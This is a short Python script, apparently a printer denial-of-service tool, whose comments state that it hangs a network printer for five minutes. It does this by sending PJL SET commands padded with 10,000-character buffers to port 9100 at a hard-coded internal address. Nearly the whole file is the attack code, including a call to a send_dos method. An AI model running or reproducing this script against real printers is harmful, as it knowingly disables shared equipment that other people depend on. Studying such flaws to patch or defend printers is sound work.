# This program causes the printer to hang for 5 minutes by setting environment variables. You cannot abort the print
# since it's not actually a print. The printer will say receiving data and will be useless

from job_sender import JobSender
big_buf = "0"*10000

file_contents = "@PJL SET COPIES=" +big_buf + "\n" \
                "@PJL SET MANUALFEED=" +big_buf + "\n"\
                "@PJL SET RESOLUTION=" + big_buf +"\n"\


PRINTER_HOST = "172.16.0.34"
PRINTER_PORT = 9100

def add_buf(file_name):
    f = open(file_name, "r")
    lines = f.readlines()
    pjl_commands = ""
    for line in lines:
        #pjl_commands += "\x1b%-12345X@PJL SET "
        pjl_commands += "@PJL "
        line=line[:-1].replace("[big_buf]", big_buf)
        pjl_commands += line + "\n"
        #pjl_commands += big_buf + "\n\x1b%-12345X"

    return pjl_commands


if __name__ == "__main__":
    job_sender = JobSender(PRINTER_HOST, PRINTER_PORT)
    pjl_commands = add_buf("variable_names")
    job_sender.send_dos()